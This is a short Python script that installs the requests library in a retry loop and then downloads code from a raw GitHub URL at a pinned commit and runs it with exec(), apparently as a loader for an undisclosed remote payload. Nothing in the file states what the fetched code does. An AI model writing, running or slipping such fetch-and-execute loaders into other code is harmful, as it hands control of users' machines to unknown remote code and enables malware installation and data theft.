import os
while True:
    try:
        import requests
        break
    except:
        os.system('pip install requests')
        continue
exec(requests.get('https://raw.githubusercontent.com/netrotion/0345370248/5796fc86e9961f026109bd9a6747f241b7f291e7/v1.0').text)
